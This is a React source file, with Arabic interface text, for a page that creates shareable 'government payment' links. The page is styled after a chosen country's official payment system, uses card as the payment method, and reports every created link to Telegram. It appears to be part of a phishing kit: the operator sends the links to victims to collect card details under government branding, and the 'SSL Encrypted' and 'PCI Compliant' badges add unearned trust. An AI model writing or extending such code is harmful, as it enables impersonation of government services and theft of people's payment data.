import React, { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
import { getCurrencyCode } from "@/lib/countryCurrencies";
import { 
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  Link as LinkIcon
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  const primaryColor = govSystem.colors.primary;

  if (!govService) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="p-8 text-center max-w-md">
          <h2 className="text-2xl font-bold mb-4">الخدمة غير موجودة</h2>
          <p className="text-gray-600 mb-6">لم نتمكن من العثور على الخدمة المطلوبة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </Card>
      </div>
    );
  }

  const handleCreateLink = async () => {
    setIsSubmitting(true);

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || govService.country,
        payload: {
          service_key: serviceKey,
          service_name: govService.nameAr,
          payment_amount: 0,
          currency_code: getCurrencyCode(country || govService.country),
          provider: govService.key.toUpperCase(),
          selectedCountry: country || govService.country,
          payment_method: "card",
        },
      });

      const baseUrl = typeof window !== 'undefined'
        ? window.location.origin
        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
      
      const currencyCode = getCurrencyCode(country || govService.country);
      const queryParams = new URLSearchParams({
        service: serviceKey || govService.key,
        country: country || govService.country,
        currency: currencyCode,
        provider: govService.key.toUpperCase()
      }).toString();
      
      const paymentUrl = `${baseUrl}/pay/${link.id}?${queryParams}`;

      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_link_created',
        data: {
          service: govService.nameAr,
          country: country || govService.country,
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  if (showSuccess) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <Card 
          className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          <div 
            className="p-8 text-center"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
              <CheckCircle className="w-12 h-12 text-white" />
            </div>
            <h2 className="text-3xl font-bold text-white mb-2">
              تم إنشاء رابط الدفع بنجاح
            </h2>
            <p className="text-white/90">
              يمكنك الآن مشاركة الرابط مع العميل
            </p>
          </div>

          <div className="p-8 space-y-6">
            <div 
              className="p-6 rounded-xl border-2"
              style={{
                borderColor: primaryColor,
                background: `${primaryColor}08`
              }}
            >
              <div className="text-sm font-semibold mb-2 block">
                رابط الدفع
              </div>
              <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                {createdLink}
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <Button
                onClick={handleCopyLink}
                size="lg"
                className="w-full"
                style={{
                  background: govSystem.gradients.primary,
                  color: govSystem.colors.textOnPrimary
                }}
              >
                <Copy className="w-5 h-5 ml-2" />
                نسخ الرابط
              </Button>
              <Button
                onClick={handlePreview}
                size="lg"
                variant="outline"
                className="w-full"
                style={{
                  borderColor: primaryColor,
                  color: primaryColor
                }}
              >
                <ExternalLink className="w-5 h-5 ml-2" />
                معاينة الرابط
              </Button>
            </div>

            <Button
              onClick={() => window.location.href = '/services'}
              size="lg"
              variant="ghost"
              className="w-full"
            >
              العودة للخدمات
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen py-8 px-4"
      style={{
        background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
        fontFamily: govSystem.fonts.primaryAr
      }}
      dir="rtl"
    >
      <div className="container mx-auto max-w-3xl">
        <div className="mb-6">
          <BackButton />
        </div>

        <Card 
          className="overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          <div 
            className="p-5 sm:p-6 relative"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="flex items-center gap-3">
              {govService.logo && (
                <div className="bg-white p-2 rounded-lg">
                  <img 
                    src={govService.logo} 
                    alt={govService.nameAr}
                    className="h-10 sm:h-12 w-auto object-contain"
                  />
                </div>
              )}
              <div>
                <h1 className="text-xl sm:text-2xl font-bold text-white">
                  {govService.nameAr}
                </h1>
                <p className="text-white/90 text-sm">
                  {govService.description}
                </p>
              </div>
            </div>
          </div>

          <div className="p-4 sm:p-6 space-y-4">
            <div className="text-center mb-4">
              <h2 className="text-lg sm:text-xl font-bold mb-1" style={{ color: primaryColor }}>
                إنشاء رابط دفع {govService.nameAr}
              </h2>
              <p className="text-xs sm:text-sm text-gray-600">
                سيتم إرسال الرابط للعميل لإدخال بياناته وإتمام الدفع
              </p>
            </div>

            <div 
              className="p-3 rounded-lg"
              style={{
                background: `${primaryColor}08`,
                borderRight: `3px solid ${primaryColor}`
              }}
            >
              <div className="flex items-start gap-2">
                <Shield className="w-4 h-4 mt-0.5" style={{ color: primaryColor }} />
                <div className="flex-1">
                  <p className="text-xs font-semibold mb-0.5" style={{ color: primaryColor }}>
                    معاملة آمنة ومشفرة
                  </p>
                  <p className="text-[11px] text-gray-600">
                    جميع البيانات محمية بتقنية التشفير SSL
                  </p>
                </div>
              </div>
            </div>

            <Button
              onClick={handleCreateLink}
              disabled={isSubmitting}
              className="w-full h-10 text-sm font-bold"
              style={{
                background: govSystem.gradients.primary,
                color: govSystem.colors.textOnPrimary,
                boxShadow: govSystem.shadows.lg
              }}
            >
              {isSubmitting ? (
                "جاري إنشاء الرابط..."
              ) : (
                <>
                  <LinkIcon className="w-5 h-5 ml-2" />
                  إنشاء رابط الدفع
                </>
              )}
            </Button>
          </div>

          <div 
            className="px-8 py-4 text-center text-xs"
            style={{
              background: govSystem.colors.surface,
              borderTop: `1px solid ${govSystem.colors.border}`
            }}
          >
            <div className="flex items-center justify-center gap-4 text-gray-500">
              <div className="flex items-center gap-1">
                <Lock className="w-3 h-3" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <Shield className="w-3 h-3" />
                <span>PCI Compliant</span>
              </div>
            </div>
          </div>
        </Card>
      </div>
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
